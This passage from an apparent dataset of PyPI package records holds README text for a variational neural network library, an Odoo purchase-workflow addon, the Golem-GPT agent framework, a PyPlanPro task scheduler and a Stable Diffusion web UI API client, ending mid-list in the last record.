                Convolution(256, 256, 9, 2, **kwargs),
                Convolution(256, 16, 4, 1, **kwargs),
                torch.nn.Flatten(start_dim=1),
                Linear(3 * 3 * 16, 10, **kwargs),
            )

        def forward(self, x):

            return self.model(x)

based_vnn = create_based(VariationalConvolution, VariationalLinear)
based_classic = create_based(ClassicConvolution, ClassicLinear)
based_dropout = create_based(DropoutConvolution, DropoutLinear)
based_functional = create_based(FunctionalConvolution, FunctionalLinear) # see hypermodels on how to use functional layers

```

## Citation

If you use this work for your research, you can cite it as:
### Library:
```
@article{oleksiienko2022vnntorchjax,
    title = {Variational Neural Networks implementation in Pytorch and JAX},
    author = {Oleksiienko, Illia and Tran, Dat Thanh and Iosifidis, Alexandros},
    journal = {Software Impacts},
    volume = {14},
    pages = {100431},
    year = {2022},
}
```
### Paper:
```
@article{oleksiienko2023vnn,
  title={Variational Neural Networks}, 
  author = {Oleksiienko, Illia and Tran, Dat Thanh and Iosifidis, Alexandros},
  journal={arxiv:2207.01524}, 
  year={2023},
}
```
","# Variational Neural Networks Pytorch

This repository contains a Pytorch implementation of Variational Neural Networks (VNNs) and image classification experiments for [Variational Neural Networks paper](https://arxiv.org/abs/2207.01524).

The corresponding package contains layer implementations for VNNs and other used architectures. It can be installed using `pip install vnn`.

Bayesian Neural Networks (BNNs) provide a tool to estimate the uncertainty of a neural network by considering a distribution over weights and sampling different models for each input. In this paper, we propose a method for uncertainty estimation in neural networks called Variational Neural Network that, instead of considering a distribution over weights, generates parameters for the output distribution of a layer by transforming its inputs with learnable sub-layers. In uncertainty quality estimation experiments, we show that VNNs achieve better uncertainty quality than Monte Carlo Dropout or Bayes By Backpropagation methods.

## Run

Use `run_example.sh` to train and evaluate a single model on MNIST.
The corresponding reproducible capsule is available at [CodeOcean](https://codeocean.com/capsule/9585164/tree).

## Package
Use `pip install vnn` or `python3 -m pip install vnn` to install the package.
The package includes only the layer implementations of VNNs, as well as dropout, functional and classic layers.
These layers are implemented with the same interface, making it easy to implement different versions of your desired network by changing the class names.

An example of a simple convolutional network:
```python
import torch
from vnn import VariationalConvolution, VariationalLinear

class Based(torch.nn.Module):

    def __init__(self, **kwargs) -> None:

        super().__init__()

        self.model = nn.Sequential(
            VariationalConvolution(1, 256, 9, 1, **kwargs),
            VariationalConvolution(256, 256, 9, 2, **kwargs),
            VariationalConvolution(256, 16, 4, 1, **kwargs),
            torch.nn.Flatten(start_dim=1),
            VariationalLinear(3 * 3 * 16, 10, **kwargs),
        )

    def forward(self, x):

        return self.model(x)
```

The same classic network:

```python
import torch
from vnn.classic import ClassicConvolution, ClassicLinear

class Based(torch.nn.Module):

    def __init__(self, **kwargs) -> None:

        super().__init__()

        self.model = nn.Sequential(
            ClassicConvolution(1, 256, 9, 1, **kwargs),
            ClassicConvolution(256, 256, 9, 2, **kwargs),
            ClassicConvolution(256, 16, 4, 1, **kwargs),
            torch.nn.Flatten(start_dim=1),
            ClassicLinear(3 * 3 * 16, 10, **kwargs),
        )

    def forward(self, x):

        return self.model(x)
```

Or a generalized network class:
```python
import torch
from vnn import VariationalConvolution, VariationalLinear
from vnn.classic import ClassicConvolution, ClassicLinear
from vnn.dropout import DropoutConvolution, DropoutLinear
from vnn.functional import FunctionalConvolution, FunctionalLinear

def create_based(Convolution, Linear):
    class Based(torch.nn.Module):

        def __init__(self, **kwargs) -> None:

            super().__init__()

            self.model = nn.Sequential(
                Convolution(1, 256, 9, 1, **kwargs),
                Convolution(256, 256, 9, 2, **kwargs),
                Convolution(256, 16, 4, 1, **kwargs),
                torch.nn.Flatten(start_dim=1),
                Linear(3 * 3 * 16, 10, **kwargs),
            )

        def forward(self, x):

            return self.model(x)

based_vnn = create_based(VariationalConvolution, VariationalLinear)
based_classic = create_based(ClassicConvolution, ClassicLinear)
based_dropout = create_based(DropoutConvolution, DropoutLinear)
based_functional = create_based(FunctionalConvolution, FunctionalLinear) # see hypermodels on how to use functional layers

```

## Citation

If you use this work for your research, you can cite it as:
### Library:
```
@article{oleksiienko2022vnntorchjax,
    title = {Variational Neural Networks implementation in Pytorch and JAX},
    author = {Oleksiienko, Illia and Tran, Dat Thanh and Iosifidis, Alexandros},
    journal = {Software Impacts},
    volume = {14},
    pages = {100431},
    year = {2022},
}
```
### Paper:
```
@article{oleksiienko2023vnn,
  title={Variational Neural Networks}, 
  author = {Oleksiienko, Illia and Tran, Dat Thanh and Iosifidis, Alexandros},
  journal={arxiv:2207.01524}, 
  year={2023},
}
```
",iliiliiliili/variational-nn-pytorch
odoo-addon-purchase-no-rfq,https://github.com/OCA/purchase-workflow,1,3956,3555,"=========================================
Purchase Order - No Request For Quotation
=========================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/16.0/purchase_no_rfq
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-16-0/purchase-workflow-16-0-purchase_no_rfq
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends the odoo purchase module, to remove 'Request for Quotation' state, simplifying
the workflow for the end users.

Once installed :

* The menu item 'Purchase > Purchase > Requests for Quotation' is hidden. A single menu item 'Purchase Order'
  is available

* The states names of the purchase order is altered. 'RFQ' is replaced by 'Draft' and 'RFQ sent' by 'Sent'.

* The colors in the tree view is correctly set to ``decoration-info`` for 'draft' and 'sent' orders.

.. figure:: https://raw.githubusercontent.com/OCA/purchase-workflow/16.0/purchase_no_rfq/static/description/purchase_order_tree.png

* In the form view, all the RFQ names are removed or replaced by 'Purchase Order'.
  The module makes also the 'Print' button allways available and not only on 'draft' and 'sent' status.

* The option 'Print > Request For quotation' is also disabled.

.. figure:: https://raw.githubusercontent.com/OCA/purchase-workflow/16.0/purchase_no_rfq/static/description/purchase_order_form.png

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/purchase-workflow/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/purchase-workflow/issues/new?body=module:%20purchase_no_rfq%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* GRAP

Contributors
~~~~~~~~~~~~

* Sylvain LE GAL <https://twitter.com/legalsylvain>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-legalsylvain| image:: https://github.com/legalsylvain.png?size=40px
    :target: https://github.com/legalsylvain
    :alt: legalsylvain

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-legalsylvain| 

This module is part of the `OCA/purchase-workflow <https://github.com/OCA/purchase-workflow/tree/16.0/purchase_no_rfq>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=========================================
Purchase Order - No Request For Quotation
=========================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/16.0/purchase_no_rfq
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-16-0/purchase-workflow-16-0-purchase_no_rfq
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends the odoo purchase module, to remove 'Request for Quotation' state, simplifying
the workflow for the end users.

Once installed :

* The menu item 'Purchase > Purchase > Requests for Quotation' is hidden. A single menu item 'Purchase Order'
  is available

* The states names of the purchase order is altered. 'RFQ' is replaced by 'Draft' and 'RFQ sent' by 'Sent'.

* The colors in the tree view is correctly set to ``decoration-info`` for 'draft' and 'sent' orders.

.. figure:: https://raw.githubusercontent.com/OCA/purchase-workflow/16.0/purchase_no_rfq/static/description/purchase_order_tree.png

* In the form view, all the RFQ names are removed or replaced by 'Purchase Order'.
  The module makes also the 'Print' button allways available and not only on 'draft' and 'sent' status.

* The option 'Print > Request For quotation' is also disabled.

.. figure:: https://raw.githubusercontent.com/OCA/purchase-workflow/16.0/purchase_no_rfq/static/description/purchase_order_form.png

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* GRAP

Contributors
~~~~~~~~~~~~

* Sylvain LE GAL 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-legalsylvain| image:: https://github.com/legalsylvain.png?size=40px
    :target: https://github.com/legalsylvain
    :alt: legalsylvain

Current `maintainer `__:

|maintainer-legalsylvain| 

This module is part of the `OCA/purchase-workflow `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/purchase-workflow
golem-gpt,https://github.com/Dingolytics/golem-gpt,5,4702,4677,"Golem-GPT 
=========

![PyPI](https://img.shields.io/pypi/v/golem-gpt) ![PyPI - Status](https://img.shields.io/pypi/status/golem-gpt) ![Docker Image Size (latest by date)](https://img.shields.io/docker/image-size/dingolytics/golem-gpt?sort=date)

⚠️ **This is an experimental development. Run it on your own risk!** ⚠️

Framework for building actionable agents to achieve goals specified
by user, powered by [OpenAI](https://openai.com) [GPT-4](https://openai.com/research/gpt-4)
and [GPT-3.5](https://platform.openai.com/docs/models/gpt-3-5)


Usage
-----

The optimal way to run Golem-GPT is to use the [Docker image](https://hub.docker.com/r/dingolytics/golem-gpt) or Docker Compose.

### Requirements

- Docker or Python 3.8+ environment
- OpenAI API key

### Quick start

Put credentials to `.env`:

```bash
OPENAI_API_KEY=...
OPENAI_ORG_ID=...
OPENAI_MODEL=gpt-4
```

*(For `gpt-4` model you should have an early access enabled, it's not publicly available yet).*

Run it via Docker Compose:

```bash
docker compose build && docker compose run app
```

or via Python:

```bash
pip install --upgrade golem-gpt
python -m golemgpt
```

❗️ It's safer to run it inside Docker to have it isolated. Because
Golem can access an environment and filesystem, so it's better to keep
it inside a container.


Architecture
------------

We introduce a novel framework for building **Golems** (actionable agents)
which is based on the following high-level concepts:

- **Goals**: a set of goals, initially defined by user's input. Goals could
  be high-level definitions, like ""I want to build a web app"", or low-level
  definitions, like ""I want to create a new file with content 'Hello, world!'""

- **Cognitron**: a language model, which interprets input text and produces an
  action plan, or other kind of structured output. It runs on top of OpenAI
  models, which could be potentially replaced with any other language model.

- **Lexicon**: a set of rules and dictionary to generate prompts for Cognitron
  and interpret its structured output.

- **Action plan**: a structured output of Cognitron, which is a set of
  actions to be executed for achieving goals.

- **Actions**: a predefined executables or functions, which can interact
  with the environment to achieve goals. Actions could also be recursive or
  delegate their execution to other Golems.

- **Memory**: a storage for the Golem's current state, which can also be
  saved and loaded to continue the job later.

- **Codex**: a built-in Golem's moderator, which is responsible for
  checking the agent's actions and preventing it from doing something
  unexpected. Codex has its own Cognitrion and Lexicon.

NOTE: *In our implementation, Actions are implemented as Python functions*


Why?
----

**How is it different from [AutoGPT](https://github.com/Significant-Gravitas/Auto-GPT)?**

We build it because we like it. Our implementation is not as advanced
as AutoGPT to the moment, but it has some unique focus:

- Keeping it simple and easy to modify, also with minimal dependencies
- While keeping the core simple, we aim to make it extensible via custom
  actions, roles, policies, and other components
- We think of it as interactive tool, not necessarily to be fully autonomous
- Also we test it with GPT-3.5, which porbably sounds not super-hyped,
  but it's waaay cheaper and delivers results good enough for many use cases
- We are going to utilize it in our own development cycle, and refine it
  to fit real needs in software development


Actions supported
-----------------

The pipeline consists of the following actions:

- [x] ask_human_input(query)
- [x] get_os_details()
- [x] get_local_date()
- [x] read_file(filename)
- [x] write_file(filename, content)
- [ ] summarize_file(filename, hint, to_filename)
- [x] http_download(url, method, headers, body, to_filename)
- [ ] create_python_script(name, description, in_files, out_files)
- [ ] create_shell_script(name, description, in_files, out_files)
- [x] run_script(name)
- [ ] ask_google(query, to_filename)
- [ ] delegate_job(goal, role, in_files, out_files)
- [x] explain(comment)
- [x] reject_job(message)
- [x] finish_job(message)


Development
-----------

Setup virtualenv:

```bash
python -m venv .venv
source .venv/bin/activate
pip install --upgrade pip pip-tools
pip-compile
pip install -r requirements.txt
```

Put variables to `.env`:

```bash
OPENAI_API_KEY=...
OPENAI_ORG_ID=...
```

Start a new job:

```bash
python -m golemgpt
```

Continue saved job:

```bash
python -m golemgpt -j <job key>
```

Terminate simply with ^C or empty input.


License
-------

Golem-GPT is licensed under the [Apache-2.0](LICENSE).

Authors:

- Alexey Kinev <rudy@05bit.com>
","Golem-GPT 
=========

![PyPI](https://img.shields.io/pypi/v/golem-gpt) ![PyPI - Status](https://img.shields.io/pypi/status/golem-gpt) ![Docker Image Size (latest by date)](https://img.shields.io/docker/image-size/dingolytics/golem-gpt?sort=date)

⚠️ **This is an experimental development. Run it on your own risk!** ⚠️

Framework for building actionable agents to achieve goals specified
by user, powered by [OpenAI](https://openai.com) [GPT-4](https://openai.com/research/gpt-4)
and [GPT-3.5](https://platform.openai.com/docs/models/gpt-3-5)


Usage
-----

The optimal way to run Golem-GPT is to use the [Docker image](https://hub.docker.com/r/dingolytics/golem-gpt) or Docker Compose.

### Requirements

- Docker or Python 3.8+ environment
- OpenAI API key

### Quick start

Put credentials to `.env`:

```bash
OPENAI_API_KEY=...
OPENAI_ORG_ID=...
OPENAI_MODEL=gpt-4
```

*(For `gpt-4` model you should have an early access enabled, it's not publicly available yet).*

Run it via Docker Compose:

```bash
docker compose build && docker compose run app
```

or via Python:

```bash
pip install --upgrade golem-gpt
python -m golemgpt
```

❗️ It's safer to run it inside Docker to have it isolated. Because
Golem can access an environment and filesystem, so it's better to keep
it inside a container.


Architecture
------------

We introduce a novel framework for building **Golems** (actionable agents)
which is based on the following high-level concepts:

- **Goals**: a set of goals, initially defined by user's input. Goals could
  be high-level definitions, like ""I want to build a web app"", or low-level
  definitions, like ""I want to create a new file with content 'Hello, world!'""

- **Cognitron**: a language model, which interprets input text and produces an
  action plan, or other kind of structured output. It runs on top of OpenAI
  models, which could be potentially replaced with any other language model.

- **Lexicon**: a set of rules and dictionary to generate prompts for Cognitron
  and interpret its structured output.

- **Action plan**: a structured output of Cognitron, which is a set of
  actions to be executed for achieving goals.

- **Actions**: a predefined executables or functions, which can interact
  with the environment to achieve goals. Actions could also be recursive or
  delegate their execution to other Golems.

- **Memory**: a storage for the Golem's current state, which can also be
  saved and loaded to continue the job later.

- **Codex**: a built-in Golem's moderator, which is responsible for
  checking the agent's actions and preventing it from doing something
  unexpected. Codex has its own Cognitrion and Lexicon.

NOTE: *In our implementation, Actions are implemented as Python functions*


Why?
----

**How is it different from [AutoGPT](https://github.com/Significant-Gravitas/Auto-GPT)?**

We build it because we like it. Our implementation is not as advanced
as AutoGPT to the moment, but it has some unique focus:

- Keeping it simple and easy to modify, also with minimal dependencies
- While keeping the core simple, we aim to make it extensible via custom
  actions, roles, policies, and other components
- We think of it as interactive tool, not necessarily to be fully autonomous
- Also we test it with GPT-3.5, which porbably sounds not super-hyped,
  but it's waaay cheaper and delivers results good enough for many use cases
- We are going to utilize it in our own development cycle, and refine it
  to fit real needs in software development


Actions supported
-----------------

The pipeline consists of the following actions:

- [x] ask_human_input(query)
- [x] get_os_details()
- [x] get_local_date()
- [x] read_file(filename)
- [x] write_file(filename, content)
- [ ] summarize_file(filename, hint, to_filename)
- [x] http_download(url, method, headers, body, to_filename)
- [ ] create_python_script(name, description, in_files, out_files)
- [ ] create_shell_script(name, description, in_files, out_files)
- [x] run_script(name)
- [ ] ask_google(query, to_filename)
- [ ] delegate_job(goal, role, in_files, out_files)
- [x] explain(comment)
- [x] reject_job(message)
- [x] finish_job(message)


Development
-----------

Setup virtualenv:

```bash
python -m venv .venv
source .venv/bin/activate
pip install --upgrade pip pip-tools
pip-compile
pip install -r requirements.txt
```

Put variables to `.env`:

```bash
OPENAI_API_KEY=...
OPENAI_ORG_ID=...
```

Start a new job:

```bash
python -m golemgpt
```

Continue saved job:

```bash
python -m golemgpt -j 
```

Terminate simply with ^C or empty input.


License
-------

Golem-GPT is licensed under the [Apache-2.0](LICENSE).

Authors:

- Alexey Kinev 
",dingolytics/golem-gpt
pyplanpro,https://github.com/Oestergaard-A-S/PyPlanPro,1,2244,2244,"# PyPlanPro

**UNDER CONSTRUCTION**

This project is currently under construction and is not yet ready for use. We are working hard to bring you a great project, and will update this README as soon as it's ready for use. Thank you for your patience!

In the meantime, feel free to check out the project code and contribute if you'd like. We welcome any feedback or suggestions you may have. 

This Python program is a task scheduler that takes a set of tasks and assigns them to resources within their respective resource groups. The program uses Google OR-Tools library to build a constraint programming model and solve it, minimizing the makespan of the tasks.

## Features
Define tasks with duration, priority, and resource groups
Define resources with availability slots
Schedule tasks to resources within their respective resource groups, minimizing the makespan
Output the optimal or feasible schedule if found
## Requirements
To run this program, you need to have the following packages installed:

Python 3.6 or later
ortools (pip install ortools)

## Installation
```python
pip install pyplanpro
```
## Usage
1. Import the necessary classes and functions:
```python
from pyplanpro import Resource, ResourceGroup, Task, Scheduler
```
2. Define resources and resource groups:
```python
r1_availability_slots = [
     {""slot_id"" : 0, ""start"":0, ""end"":4},
     {""slot_id"" : 1, ""start"":5, ""end"":10}
]
r2_availability_slots = [
     {""slot_id"" : 0, ""start"":0, ""end"":10}
]
resource1 = Resource(id=1, availability_slots=r1_availability_slots)
resource2 = Resource(id=2, availability_slots=r2_availability_slots)
resource_group = ResourceGroup(id=1, resources=[resource1, resource2])
```
3. Define tasks with duration, and resource group:
```python
tasks = [Task(id=1, duration=3, resource_group=resource_group)]
```
4. Set the scheduling horizon:
```python
horizon = 50
```
5. Call the Scheduler function with tasks and horizon:
```python
s = Scheduler()
s.schedule(tasks, horizon= horizon)
```
If a solution is found, the program will print the optimal or feasible schedule with makespan, resource assignments, task start and end times, and durations.
```
Makespan = 8.0
Assigned to resource 2
Task (0, 0): starts: 0, end: 8, duration: 8
```
","# PyPlanPro

**UNDER CONSTRUCTION**

This project is currently under construction and is not yet ready for use. We are working hard to bring you a great project, and will update this README as soon as it's ready for use. Thank you for your patience!

In the meantime, feel free to check out the project code and contribute if you'd like. We welcome any feedback or suggestions you may have. 

This Python program is a task scheduler that takes a set of tasks and assigns them to resources within their respective resource groups. The program uses Google OR-Tools library to build a constraint programming model and solve it, minimizing the makespan of the tasks.

## Features
Define tasks with duration, priority, and resource groups
Define resources with availability slots
Schedule tasks to resources within their respective resource groups, minimizing the makespan
Output the optimal or feasible schedule if found
## Requirements
To run this program, you need to have the following packages installed:

Python 3.6 or later
ortools (pip install ortools)

## Installation
```python
pip install pyplanpro
```
## Usage
1. Import the necessary classes and functions:
```python
from pyplanpro import Resource, ResourceGroup, Task, Scheduler
```
2. Define resources and resource groups:
```python
r1_availability_slots = [
     {""slot_id"" : 0, ""start"":0, ""end"":4},
     {""slot_id"" : 1, ""start"":5, ""end"":10}
]
r2_availability_slots = [
     {""slot_id"" : 0, ""start"":0, ""end"":10}
]
resource1 = Resource(id=1, availability_slots=r1_availability_slots)
resource2 = Resource(id=2, availability_slots=r2_availability_slots)
resource_group = ResourceGroup(id=1, resources=[resource1, resource2])
```
3. Define tasks with duration, and resource group:
```python
tasks = [Task(id=1, duration=3, resource_group=resource_group)]
```
4. Set the scheduling horizon:
```python
horizon = 50
```
5. Call the Scheduler function with tasks and horizon:
```python
s = Scheduler()
s.schedule(tasks, horizon= horizon)
```
If a solution is found, the program will print the optimal or feasible schedule with makespan, resource assignments, task start and end times, and durations.
```
Makespan = 8.0
Assigned to resource 2
Task (0, 0): starts: 0, end: 8, duration: 8
```
",oestergaard-a-s/pyplanpro
easyai-sdwebui-api,https://github.com/freemindcore/sdwebuiapi,11,10631,10601,"# easyai
API client for AUTOMATIC1111/stable-diffusion-webui

Supports txt2img, img2img, extra-single-image, extra-batch-images API calls.

API support have to be enabled from webui. Add --api when running webui.
It's explained [here](https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki/API).

You can use --api-auth user1:pass1,user2:pass2 option to enable authentication for api access.
(Since it's basic http authentication the password is transmitted in cleartext)

API calls are (almost) direct translation from http://127.0.0.1:7860/docs as of 2022/11/21.

# Install

```
pip install easyai
```

# Usage

easyai_demo.ipynb contains example code with original images. Images are compressed as jpeg in this document.

## create API client
```
import easyai

# create API client
api = easyai.EasyAPI()

# create API client with custom host, port
#api = easyai.EasyAPI(host='127.0.0.1', port=7860)

# create API client with custom host, port and https
#api = easyai.EasyAPI(host='webui.example.com', port=443, use_https=True)

# create API client with default sampler, steps.
#api = easyai.EasyAPI(sampler='Euler a', steps=20)

# optionally set username, password when --api-auth is set on webui.
api.set_auth('username', 'password')
```

## txt2img
```
result1 = api.txt2img(prompt=""cute squirrel"",
                    negative_prompt=""ugly, out of frame"",
                    seed=1003,
                    styles=[""anime""],
                    cfg_scale=7,
#                      sampler_index='DDIM',
#                      steps=30,
#                      enable_hr=True,
#                      hr_scale=2,
#                      hr_upscaler=easyai.HiResUpscaler.Latent,
#                      hr_second_pass_steps=20,
#                      hr_resize_x=1536,
#                      hr_resize_y=1024,
#                      denoising_strength=0.4,

                    )
# images contains the returned images (PIL images)
result1.images

# image is shorthand for images[0]
result1.image

# info contains text info about the api call
result1.info

# info contains paramteres of the api call
result1.parameters

result1.image
```


## img2img
```
result2 = api.img2img(images=[result1.image], prompt=""cute cat"", seed=5555, cfg_scale=6.5, denoising_strength=0.6)
result2.image
```

## img2img inpainting
```
from PIL import Image, ImageDraw

mask = Image.new('RGB', result2.image.size, color = 'black')
# mask = result2.image.copy()
draw = ImageDraw.Draw(mask)
draw.ellipse((210,150,310,250), fill='white')
draw.ellipse((80,120,160,120+80), fill='white')

mask
```

```
inpainting_result = api.img2img(images=[result2.image],
                                mask_image=mask,
                                inpainting_fill=1,
                                prompt=""cute cat"",
                                seed=104,
                                cfg_scale=5.0,
                                denoising_strength=0.7)
inpainting_result.image
```

## extra-single-image
```
result3 = api.extra_single_image(image=result2.image,
                                 upscaler_1=easyai.Upscaler.ESRGAN_4x,
                                 upscaling_resize=1.5)
print(result3.image.size)
result3.image
```
(768, 768)


## extra-batch-images
```
result4 = api.extra_batch_images(images=[result1.image, inpainting_result.image],
                                 upscaler_1=easyai.Upscaler.ESRGAN_4x,
                                 upscaling_resize=1.5)
result4.images[0]
```
```
result4.images[1]
```

### Scripts support
Scripts from AUTOMATIC1111's Web UI are supported, but there aren't official models that define a script's interface.

To find out the list of arguments that are accepted by a particular script look up the associated python file from
AUTOMATIC1111's repo `scripts/[script_name].py`. Search for its `run(p, **args)` function and the arguments that come
after 'p' is the list of accepted arguments

#### Example for X/Y/Z Plot script:
```
(scripts/xyz_grid.py file from AUTOMATIC1111's repo)

    def run(self, p, x_type, x_values, y_type, y_values, z_type, z_values, draw_legend, include_lone_images, include_sub_grids, no_fixed_seeds, margin_size):
    ...
```
List of accepted arguments:
* _x_type_: Index of the axis for X axis. Indexes start from [0: Nothing]
* _x_values_: String of comma-separated values for the X axis
* _y_type_: Index of the axis type for Y axis. As the X axis, indexes start from [0: Nothing]
* _y_values_: String of comma-separated values for the Y axis
* _z_type_: Index of the axis type for Z axis. As the X axis, indexes start from [0: Nothing]
* _z_values_: String of comma-separated values for the Z axis
* _draw_legend_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* _include_lone_images_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* _include_sub_grids_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* _no_fixed_seeds_: ""True"" or ""False"". IMPORTANT: It needs to be a string and not a Boolean value
* margin_size: int value
```
# Available Axis options (Different for txt2img and img2img!)
XYZPlotAvailableTxt2ImgScripts = [
    ""Nothing"",
    ""Seed"",
    ""Var. seed"",
    ""Var. strength"",
    ""Steps"",
    ""Hires steps"",
    ""CFG Scale"",
    ""Prompt S/R"",
    ""Prompt order"",
    ""Sampler"",
    ""Checkpoint name"",
    ""Sigma Churn"",
    ""Sigma min"",
    ""Sigma max"",
    ""Sigma noise"",
    ""Eta"",
    ""Clip skip"",
    ""Denoising"",
    ""Hires upscaler"",
    ""VAE"",
    ""Styles"",
]

XYZPlotAvailableImg2ImgScripts = [
    ""Nothing"",
    ""Seed"",
    ""Var. seed"",
    ""Var. strength"",
    ""Steps"",
    ""CFG Scale"",
    ""Image CFG Scale"",
    ""Prompt S/R"",
    ""Prompt order"",
    ""Sampler"",
    ""Checkpoint name"",
    ""Sigma Churn"",
    ""Sigma min"",
    ""Sigma max"",
    ""Sigma noise"",
    ""Eta"",
    ""Clip skip"",
    ""Denoising"",
    ""Cond. Image Mask Weight"",
    ""VAE"",
    ""Styles"",
]

# Example call
XAxisType = ""Steps""
XAxisValues = ""20,30""
YAxisType = ""Sampler""
YAxisValues = ""Euler a, LMS""
ZAxisType = ""Nothing""
ZAxisValues = """"
drawLegend = ""True""
includeLoneImages = ""False""
includeSubGrids = ""False""
noFixedSeeds = ""False""
marginSize = 0


# x_type, x_values, y_type, y_values, z_type, z_values, draw_legend, include_lone_images, include_sub_grids, no_fixed_seeds, margin_size

result = api.txt2img(
                    prompt=""cute girl with short brown hair in black t-shirt in animation style"",
                    seed=1003,
                    script_name=""X/Y/Z Plot"",
                    script_args=[
                        XYZPlotAvailableTxt2ImgScripts.index(XAxisType),
                        XAxisValues,
                        XYZPlotAvailableTxt2ImgScripts.index(YAxisType),
                        YAxisValues,
                        XYZPlotAvailableTxt2ImgScripts.index(ZAxisType),
                        ZAxisValues,
                        drawLegend,
                        includeLoneImages,
                        includeSubGrids,
                        noFixedSeeds,
                        marginSize,                        ]
                    )

result.image
```


### Configuration APIs
```
# return map of current options
options = api.get_options()

# change sd model
options = {}
options['sd_model_checkpoint'] = 'model.ckpt [7460a6fa]'
api.set_options(options)

# when calling set_options, do not pass all options returned by get_options().
# it makes webui unusable (2022/11/21).

# get available sd models
api.get_sd_models()

# misc get apis
api.get_samplers()
api.get_cmd_flags()
api.get_hypernetworks()
api.get_face_restorers()
api.get_realesrgan_models()
api.get_prompt_styles()
api.get_artist_categories()
api.get_artists()
api.get_progress()
```

### Utility methods
```
# save current model name
old_model = api.util_get_current_model()

# get list of available models
models = api.util_get_model_names()

# set model (use exact name)
api.util_set_model(models[0])

# set model (find closest match)
api.util_set_model('robodiffusion')

# wait for job complete
api.util_wait_for_ready()

```

### LORA and alwayson_scripts example

```
r = api.txt2img(prompt='photo of a cute girl with green hair <lora:Moxin_10:0.6> shuimobysim __juice__',
                seed=1000,
                save_images=True,
                alwayson_scripts={""Simple wildcards"":[]} # wildcards extension doesn't accept more parameters.
               )
r.image
```

### Extension support - Model-Keyword
```
# https://github.com/mix1009/model-keyword
mki = easyai.ModelKeywordInterface(api)
mki.get_keywords()
```
ModelKeywordResult(keywords=['nousr robot'], model='robo-diffusion-v1.ckpt', oldhash='41fef4bd', match_source='model-keyword.txt')


### Extension support - Instruct-Pix2Pix
```
# Instruct-Pix2Pix extension is now deprecated and is now part of webui.
# You can use normal img2img with image_cfg_scale when instruct-pix2pix model is loaded.
r = api.img2img(prompt='sunset', images=[pil_img], cfg_scale=7.5, image_cfg_scale=1.5)
r.image
```

### Extension support - ControlNet
```
# https://github.com/Mikubill/sd-webui-controlnet
cn = easyai.ControlNetInterface(api)
cn.model_list()
```
<pre>
['control_canny-fp16 [e3fe7712]',
 'control_depth-fp16 [400750f6]',
 'control_hed-fp16 [13fee50b]',
 'control_mlsd-fp16 [e3705cfa]',
 'control_normal-fp16 [63f96f7c]',
